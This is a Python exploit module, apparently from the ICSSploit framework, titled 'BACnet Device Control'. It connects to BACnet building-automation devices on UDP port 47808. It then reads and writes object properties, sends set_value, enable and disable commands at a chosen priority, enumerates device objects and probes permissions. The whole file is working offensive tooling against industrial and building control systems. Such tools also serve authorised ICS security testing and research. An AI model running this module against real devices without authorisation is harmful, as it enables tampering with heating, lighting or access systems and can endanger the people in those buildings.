from src import (
    exploits,
    print_success,
    print_status,
    print_error,
    validators,
)
from src.clients.bacnet_client import BACnetClient


class Exploit(exploits.Exploit):
    __info__ = {
        'name': 'BACnet Device Control',
        'authors': [
            'ICSSploit Team'  # icssploit module
        ],
        'description': 'Control BACnet devices by reading/writing properties and executing commands.',
        'references': [
            'https://www.bacnet.org/',
        ],
        'devices': [
            'BACnet compliant devices',
        ],
    }

    target = exploits.Option('', 'Target BACnet device IP address')
    port = exploits.Option(47808, 'BACnet port, default is 47808/UDP', validators=validators.integer)
    operation = exploits.Option('read', 'Operation to perform: read, write, command, enumerate, permissions', 
                               validators=validators.choice(['read', 'write', 'command', 'enumerate', 'permissions']))
    object_id = exploits.Option('device,1', 'Object identifier (e.g., analogInput,1)')
    property_id = exploits.Option('objectName', 'Property identifier (e.g., presentValue)')
    value = exploits.Option('', 'Value to write (for write operations)')
    command = exploits.Option('', 'Command to execute: set_value, enable, disable')
    priority = exploits.Option(16, 'Priority level for commands (1-16, 16 is highest)', validators=validators.integer)

    def run(self):
        if not self.target:
            print_error("Target IP address is required")
            return
        
        print_status(f"Connecting to BACnet device at {self.target}:{self.port}")
        
        try:
            target = BACnetClient(name='BACnetController', ip=self.target, port=self.port, timeout=5)
            
            if not target.connect():
                print_error(f"Failed to connect to BACnet device at {self.target}:{self.port}")
                return
            
            print_success(f"Connected to BACnet device at {self.target}:{self.port}")
            
            if self.operation == 'read':
                self._read_operation(target)
            elif self.operation == 'write':
                self._write_operation(target)
            elif self.operation == 'command':
                self._command_operation(target)
            elif self.operation == 'enumerate':
                self._enumerate_operation(target)
            elif self.operation == 'permissions':
                self._permissions_operation(target)
            else:
                print_error(f"Unknown operation: {self.operation}")
            
            target.disconnect()
            
        except Exception as e:
            print_error(f"Error during BACnet operation: {e}")
    
    def _read_operation(self, target):
        """Read property operation"""
        print_status(f"Reading {self.property_id} from {self.object_id}")
        
        try:
            value = target.read_property(self.object_id, self.property_id)
            if value is not None:
                print_success(f"Value: {value}")
            else:
                print_error("No response or property not found")
        except Exception as e:
            print_error(f"Error reading property: {e}")
    
    def _write_operation(self, target):
        """Write property operation"""
        if not self.value:
            print_error("Value is required for write operations")
            return
        
        print_status(f"Writing {self.value} to {self.property_id} of {self.object_id}")
        
        try:
            # Try to convert value to appropriate type
            if self.value.lower() in ['true', 'false']:
                value = self.value.lower() == 'true'
            elif self.value.isdigit():
                value = int(self.value)
            elif self.value.replace('.', '').replace('-', '').isdigit():
                value = float(self.value)
            else:
                value = self.value
            
            success = target.write_property(self.object_id, self.property_id, value)
            if success:
                print_success("Write operation completed")
            else:
                print_error("Write operation failed")
        except Exception as e:
            print_error(f"Error writing property: {e}")
    
    def _command_operation(self, target):
        """Command operation"""
        if not self.command:
            print_error("Command is required for command operations")
            return
        
        print_status(f"Executing command: {self.command}")
        
        try:
            if self.command == 'set_value' and not self.value:
                print_error("Value is required for set_value command")
                return
            
            value = None
            if self.value:
                # Try to convert value to appropriate type
                if self.value.lower() in ['true', 'false']:
                    value = self.value.lower() == 'true'
                elif self.value.isdigit():
                    value = int(self.value)
                elif self.value.replace('.', '').replace('-', '').isdigit():
                    value = float(self.value)
                else:
                    value = self.value
            
            success = target.write_command(self.object_id, self.command, value, self.priority)
            if success:
                print_success(f"Command {self.command} executed successfully")
            else:
                print_error(f"Command {self.command} failed")
        except Exception as e:
            print_error(f"Error executing command: {e}")
    
    def _enumerate_operation(self, target):
        """Enumerate device operation"""
        print_status("Enumerating device objects and properties")
        
        try:
            # Get device information
            device_name, vendor_name, model_name, firmware_version, system_status, max_apdu_length = target.get_target_info()
            
            print_success("Device Information:")
            print_status(f"  Device Name: {device_name}")
            print_status(f"  Vendor: {vendor_name}")
            print_status(f"  Model: {model_name}")
            print_status(f"  Firmware: {firmware_version}")
            print_status(f"  System Status: {system_status}")
            print_status(f"  Max APDU Length: {max_apdu_length}")
            
            # Enumerate objects
            objects = target.enumerate_device()
            
            if objects:
                print_success("Device Objects:")
                for obj_type, instances in objects.items():
                    print_status(f"  {obj_type}: {len(instances)} objects")
                    for instance, name in instances[:10]:  # Show first 10
                        print_status(f"    {obj_type},{instance}: {name}")
            else:
                print_status("No objects found or enumeration failed")
                
        except Exception as e:
            print_error(f"Error enumerating device: {e}")
    
    def _permissions_operation(self, target):
        """Check permissions operation"""
        print_status(f"Checking permissions for {self.object_id}")
        
        try:
            permissions = target.check_permissions(self.object_id)
            
            print_success("Permission Check Results:")
            for perm_name, has_perm in permissions.items():
                status = "✓" if has_perm else "✗"
                print_status(f"  {status} {perm_name}")
                
        except Exception as e:
            print_error(f"Error checking permissions: {e}") 